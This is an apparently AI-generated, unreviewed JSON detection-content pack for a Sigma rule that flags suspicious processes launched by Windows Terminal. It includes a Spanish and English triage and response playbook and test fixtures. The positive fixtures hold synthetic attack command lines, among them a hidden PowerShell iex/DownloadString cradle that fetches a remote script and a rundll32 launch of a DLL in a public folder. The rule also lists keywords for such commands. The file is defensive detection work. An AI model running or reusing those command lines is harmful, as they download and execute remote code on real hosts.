@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "8de89e52-f6e1-4b5b-afd1-41ecfa300d48",
+    "title": "Suspicious WindowsTerminal Child Processes",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_windows_terminal_susp_children.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_windows_terminal_susp_children.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Windows Terminal (WindowsTerminal.exe o wt.exe) inició un proceso sospechoso: un LOLBIN, un binario en una ruta de usuario o temporal, o una línea de comandos con patrones de descarga o ejecución. Puede indicar que se modificó un perfil de Windows Terminal para lograr persistencia.",
+      "what_it_detects": "Eventos de creación de procesos cuyo ParentImage termina en \\WindowsTerminal.exe o \\wt.exe y cuyo hijo cumple al menos una condición: Image es rundll32, regsvr32, certutil, cscript, wscript o csc; Image está en Users\\Public, Downloads, Desktop o carpetas Temp; o CommandLine contiene iex, icm, Invoke-, Import-Module, ipmo, DownloadString(, /c, /k o /r. Se excluyen el shell de Visual Studio, VsDevCmd.bat y la apertura de settings.json.",
+      "why_it_matters": "Un atacante puede editar settings.json de Windows Terminal para que el perfil predeterminado, o uno que se inicia al iniciar sesión, ejecute su payload cada vez que el usuario abre la terminal. Así logra persistencia y ejecución con apariencia de uso normal.",
+      "triage_steps": [
+        "Revise Image, CommandLine y ParentImage del evento; identifique el usuario y el host afectados.",
+        "Abra %LOCALAPPDATA%\\Packages\\Microsoft.WindowsTerminal_*\\LocalState\\settings.json y busque perfiles con commandline inusual, startOnUserLogin activado o cambios en defaultProfile.",
+        "Compare la fecha de modificación de settings.json con alertas o actividad del mismo usuario en las últimas semanas.",
+        "Si Image está en Temp, Downloads, Desktop o Users\\Public, obtenga el hash, la firma digital y la reputación del archivo.",
+        "Revise los procesos hijos y las conexiones de red del proceso sospechoso en el mismo host, +/- 15 minutos.",
+        "Si CommandLine contiene DownloadString o iex, extraiga las URL o dominios y búsquelos en logs de proxy y DNS de toda la organización.",
+        "Busque alertas previas del mismo host, del mismo usuario y del mismo hash."
+      ],
+      "false_positives": [
+        "Perfiles legítimos de Windows Terminal que ejecutan cmd.exe /k o PowerShell con Import-Module para cargar herramientas de desarrollo o administración.",
+        "Shells de desarrollo de SDK o toolchains distintos de Visual Studio que no cubren los filtros.",
+        "Administradores o desarrolladores que ejecutan manualmente scripts de cscript o compilaciones con csc desde la terminal."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o su responsable si el perfil y el comando son esperados antes de actuar.",
+        "Si es malicioso, aísle el endpoint y respalde settings.json y los archivos implicados como evidencia.",
+        "Restaure settings.json eliminando el perfil o el commandline malicioso y elimine el payload tras obtener su hash.",
+        "Bloquee los hashes, URL y dominios identificados y busque los mismos indicadores en otros endpoints.",
+        "Restablezca las credenciales del usuario si hubo ejecución confirmada y supervise el host para detectar reincidencia."
+      ],
+      "severity_rationale": "Nivel medio: la combinación es poco común y puede indicar persistencia, pero los perfiles personalizados legítimos generan coincidencias que requieren validación."
+    },
+    "en": {
+      "summary": "Windows Terminal (WindowsTerminal.exe or wt.exe) spawned a suspicious child: a LOLBIN, a binary in a user-writable or temp path, or a command line with download or execution patterns. This can mean a Windows Terminal profile was modified for persistence.",
+      "what_it_detects": "Process creation events where ParentImage ends with \\WindowsTerminal.exe or \\wt.exe and the child matches at least one condition: Image is rundll32, regsvr32, certutil, cscript, wscript or csc; Image is under Users\\Public, Downloads, Desktop or Temp folders; or CommandLine contains iex, icm, Invoke-, Import-Module, ipmo, DownloadString(, /c, /k or /r. The Visual Studio dev shell, VsDevCmd.bat and opening settings.json are excluded.",
+      "why_it_matters": "An attacker can edit the Windows Terminal settings.json so that the default profile, or one set to start at logon, runs a payload whenever the user opens the terminal. This gives persistence and execution that looks like normal use.",
+      "triage_steps": [
+        "Review Image, CommandLine and ParentImage; identify the affected user and host.",
+        "Open %LOCALAPPDATA%\\Packages\\Microsoft.WindowsTerminal_*\\LocalState\\settings.json and look for profiles with unusual commandline values, startOnUserLogin enabled or a changed defaultProfile.",
+        "Compare the settings.json modification time with alerts or activity for the same user over recent weeks.",
+        "If Image is in Temp, Downloads, Desktop or Users\\Public, collect its hash, signature and reputation.",
+        "Review child processes and network connections of the suspicious process on the same host within +/- 15 minutes.",
+        "If CommandLine contains DownloadString or iex, extract URLs or domains and search proxy and DNS logs organization-wide.",
+        "Search earlier alerts for the same host, user and hash."
+      ],
+      "false_positives": [
+        "Legitimate Windows Terminal profiles running cmd.exe /k or PowerShell with Import-Module to load developer or admin tooling.",
+        "SDK or toolchain developer shells other than Visual Studio that the filters do not cover.",
+        "Admins or developers manually running cscript scripts or csc builds from the terminal."
+      ],
+      "response_steps": [
+        "Confirm with the user or their manager whether the profile and command are expected before acting.",
+        "If malicious, isolate the endpoint and preserve settings.json and related files as evidence.",
+        "Restore settings.json by removing the malicious profile or commandline, then delete the payload after recording its hash.",
+        "Block identified hashes, URLs and domains and hunt for the same indicators on other endpoints.",
+        "Reset the user's credentials if execution is confirmed and monitor the host for recurrence."
+      ],
+      "severity_rationale": "Medium fits because the combination is uncommon and can indicate persistence, but legitimate custom profiles also match and need validation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Windows Terminal launches rundll32 loading a DLL from C:\\Users\\Public (LOLBIN child)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "CommandLine": "rundll32.exe C:\\Users\\Public\\update.dll,DllRegisterServer",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "wt.exe launches PowerShell with a DownloadString cradle from a modified profile",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0287.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Users\\mrojas\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.25/profile.ps1')",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Built-in Visual Studio Developer PowerShell profile, excluded by filter_builtin_visual_studio_shell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoExit -Command \"&{Import-Module \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\Microsoft.VisualStudio.DevShell.dll\"\"; Enter-VsDevShell 3f1a2b4c -SkipAutomaticLocation}\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Default PowerShell profile opened from Windows Terminal with no suspicious image, path or arguments",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0287.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
